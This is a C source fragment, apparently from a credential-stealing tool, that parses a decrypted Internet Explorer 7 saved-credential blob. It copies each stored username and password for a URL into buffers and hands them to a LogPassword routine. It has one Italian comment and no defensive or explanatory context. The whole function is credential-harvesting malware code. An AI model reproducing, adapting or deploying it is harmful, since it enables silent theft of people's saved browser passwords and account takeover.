void ParseIE7Data(DATA_BLOB *Data_blob, WCHAR *URL)
{
    unsigned int HeaderSize;
    unsigned int DataSize;
    int DataMax;
    WCHAR User[1024];
	WCHAR Pass[1024];
	unsigned int offset;
    char *pInfo;
    char *pData;
	char *Data = (char *)(Data_blob->pbData);

    memcpy(&HeaderSize,&Data[4],4); 
    memcpy(&DataSize,&Data[8],4);   
    memcpy(&DataMax,&Data[20],4);   

	if (HeaderSize>=Data_blob->cbData || Data_blob->cbData<41)
		return;

    pInfo = &Data[36];
    pData = &Data[HeaderSize];

	for (; DataMax>0; DataMax-=2) {
		Pass[0] = 0; // Se non trova la password la WriteAccount non la scrive
		if (DataMax>=1) {
	        memcpy(&offset,pInfo,4);
			if (HeaderSize+12+offset >= Data_blob->cbData)
				return;

			_snwprintf_s(User, sizeof(User)/sizeof(WCHAR), _TRUNCATE, L"%s", &Data[HeaderSize+12+offset]);
	        pInfo+=16;
		}

		if (DataMax>=2) {
	        memcpy(&offset,pInfo,4);
			if (HeaderSize+12+offset >= Data_blob->cbData)
				return;
			
			_snwprintf_s(Pass, sizeof(Pass)/sizeof(WCHAR), _TRUNCATE, L"%s", &Data[HeaderSize+12+offset]);
		    pInfo+=16;
		}
		LogPassword(L"IExplorer", URL, User, Pass);
	}
}